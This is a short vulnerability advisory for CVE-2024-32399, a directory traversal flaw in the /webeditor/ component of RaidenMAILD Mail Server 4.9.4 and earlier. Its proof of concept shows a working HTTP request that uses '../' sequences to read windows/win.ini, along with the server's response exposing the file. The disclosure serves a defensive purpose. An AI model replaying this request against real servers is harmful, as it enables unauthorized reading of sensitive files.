# CVE-2024-32399

## Vulnerability Overview
Directory Traversal vulnerability in RaidenMAILD Mail Server v.4.9.4
and before allows a remote attacker to obtain sensitive information via
the /webeditor/ component


## Vulnerability Type
Directory Traversal


## Vendor of Product
RaidenMAILD Mail Server


## Affected Version
RaidenMAILD Mail Server <= 4.9.4


## Proof of Concept
Request:
```http
GET /webeditor/../../../windows/win.ini HTTP/1.1
Host: 127.0.0.1:81
Cache-Control: max-age=0
Connection: close
```

Response:
```http
HTTP/1.1 200 OK
Connection: close
Content-Disposition: attachment; filename="../../../windows/win.ini";
Content-Type: application/octet-stream
Content-Length: 403
Date: Mon, 22 Apr 2024 15:00:41 GMT
Strict-Transport-Security: max-age=31536000; includeSubDomains
X-Frame-Options: SAMEORIGIN
X-Content-Type-Options: nosniff
Permissions-Policy: geolocation=(self "https://example.com"), microphone=()
Referrer-Policy: no-referrer
Content-Security-Policy: base-uri 'self'
Set-Cookie: IDHTTPSESSIONID=9E5BgVAlG7P7C5X; Path=/

; for 16-bit app support
[fonts]
[extensions]
[mci extensions]
[files]
[Mail]
MAPI=1
...
...
```
